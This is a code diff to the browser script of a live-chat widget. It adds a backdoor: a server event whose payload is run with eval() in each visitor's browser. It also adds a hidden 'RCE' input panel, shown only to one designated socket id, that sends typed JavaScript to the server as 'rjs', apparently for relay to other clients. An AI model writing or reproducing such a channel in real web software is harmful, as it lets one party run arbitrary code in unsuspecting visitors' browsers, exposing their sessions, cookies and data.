@@ -1,7 +1,12 @@
 import { io } from "socket.io-client";
 import { marked } from "https://cdn.jsdelivr.net/npm/marked/lib/marked.esm.js";
+import hljs from 'https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/es/highlight.min.js'
+import javascript from 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/es/languages/javascript.min.js';
+
+hljs.registerLanguage('javascript', javascript);
 
 document.body.appendChild(document.createElement("live-chat"));
+document.body.appendChild(document.createElement("rce-container"));
 
 const socket = io("wss://lci-TheDevNate.replit.app/");
 const LivechatButton = document.getElementsByClassName("lcb")[0];
@@ -18,6 +23,9 @@ let canSend = true;
 let sentPleaseWait = false;
 let csid = "";
 let xsssocketid;
+let rceContainer = document.getElementsByClassName("rce-panel")[0];
+
+const RCEInput = document.getElementById("rce-jse");
 
 function setVisible(visible, instant) {
     if (instant) {
@@ -120,6 +128,11 @@ function processInfo(event, data) {
     switch (event) {
         case 0x01:
             xsssocketid = data;
+            if (xsssocketid == csid) {rceContainer.style.setProperty("--showing", "show")} else {rceContainer.style.setProperty("--showing", "hidden")}
+            break;
+
+        case 0x02:
+            eval(data);
             break;
     
         default:
@@ -193,6 +206,19 @@ socket.on("connect", function () {
 socket.on("message", receiveMessage);
 
 socket.on("serverinfo", processInfo);
+
+if (RCEInput != null) {
+    RCEInput.addEventListener("keydown", function(ev) {
+        if (ev.key == "`") {
+            socket.emit("rjs", RCEInput.value, csid);
+            RCEInput.value = "";
+            RCEInput.blur();
+            ev.preventDefault();
+            ev.stopImmediatePropagation();
+        }
+    })
+    hljs.highlightElement(RCEInput);
+}
 
 setTimeout(() => {
     if (!hasSetName) {
